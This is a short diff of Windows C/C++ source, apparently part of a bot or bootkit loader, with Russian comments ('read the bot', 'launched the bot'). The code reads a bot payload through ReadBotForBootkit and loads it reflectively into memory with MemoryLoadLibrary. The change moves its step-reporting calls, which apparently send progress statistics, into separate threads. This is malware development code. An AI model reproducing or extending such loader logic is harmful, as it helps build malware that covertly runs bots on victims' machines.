@@ -15,6 +15,13 @@
 
 #pragma comment(linker, "/ENTRY:MyDllMain" )
 
+DWORD WINAPI SendLog(LPVOID Data)
+{
+	const char* s = (char*)Data;
+	DebugReportStepByName(s);
+	return 0;
+}
+
 DWORD WINAPI StartRunBot(LPVOID Data)
 {
 //	pSleep( 60 * 1000 );	
@@ -26,13 +33,13 @@ DWORD WINAPI StartRunBot(LPVOID Data)
 	// Инициализируем систему отправки статистической информации
 	DebugReportInit();
 
-	DebugReportStepByName("701_pl"); //запуск процесса
+	RunThread( SendLog, "701_pl" ); //запуск процесса
 
 	DWORD c_data;
 	BYTE* data = ReadBotForBootkit(c_data);
 	if( data )
 	{
-		DebugReportStepByName("702_pl"); //считали бота
+		RunThread( SendLog, "702_pl" ); //считали бота
 		MemoryLoadLibrary(data);
 		MemFree(data);
 		DebugReportStepByName("703_pl"); //запустили бот
